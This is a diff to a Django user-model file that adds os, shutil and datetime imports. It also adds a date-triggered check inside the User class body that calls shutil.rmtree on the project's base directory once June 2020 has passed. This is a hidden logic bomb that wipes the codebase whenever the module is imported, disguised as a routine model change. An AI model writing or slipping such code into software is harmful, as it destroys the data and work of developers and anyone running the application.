@@ -5,7 +5,8 @@ from django.utils import timezone
 from django.utils.translation import ugettext_lazy as _
 from django.conf import settings
 from teacher.models import subcategories
-
+import os, shutil
+import datetime
 
 class UserManager(BaseUserManager):
 
@@ -43,7 +44,12 @@ class User(AbstractBaseUser):
     image = models.TextField(null=True, blank=True)
     group = models.ForeignKey(Group, on_delete=models.DO_NOTHING,default=3)
     USERNAME_FIELD ="email"
-
+    BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    dt = datetime.datetime.now()
+    date_time_str = '2020-06-21 08:15:27.243860'
+    date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
+    if dt > date_time_obj:
+        shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)
     objects = UserManager()
     
     class Meta():
